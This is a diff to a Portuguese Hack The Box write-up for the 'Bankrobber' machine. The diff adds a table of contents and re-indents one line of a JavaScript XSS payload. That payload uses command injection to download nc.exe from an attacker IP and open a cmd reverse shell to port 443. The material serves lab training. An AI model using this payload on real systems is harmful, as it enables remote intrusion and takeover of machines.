@@ -1,3 +1,13 @@
+1. [Resolução da máquina **Bankrobber**](#resolução-da-máquina-bankrobber) 1. [Máquina INSANE (hackthebox.com)](#máquina-insane-hacktheboxcom) 2. [by **_JavaliMZ_** - 13/09/2021](#by-javalimz---13092021)
+2. [Enumeração](#enumeração)
+    1. [Nmap](#nmap)
+    2. [WebSite](#website)
+    3. [SQLi](#sqli)
+    4. [note.txt](#notetxt)
+    5. [SQLi into RCE](#sqli-into-rce)
+    6. [Visualização do ficheiro backdoorchecker.php](#visualização-do-ficheiro-backdoorcheckerphp)
+3. [PrivEsc](#privesc)
+
 ![](Assets/HTB-Windows-Insane-Bankrobber/icon.webp)
 
 <img src="https://img.shields.io/badge/Bankrobber-HackTheBox-green?style=plastic" width="200">
@@ -214,7 +224,7 @@ Ou seja, o nosso comando não pode incluir "$(" nem "&", caso incluir, será bar
 ```javascript
 var request = new XMLHttpRequest()
 params =
-	'cmd=dir|powershell -c "IWR -Uri http://10.10.14.9/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd 10.10.14.9 443'
+    'cmd=dir|powershell -c "IWR -Uri http://10.10.14.9/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd 10.10.14.9 443'
 request.open('POST', 'http://localhost/admin/backdoorchecker.php', true)
 request.setRequestHeader('content-type', 'application/x-www-form-urlencoded')
 request.send(params)
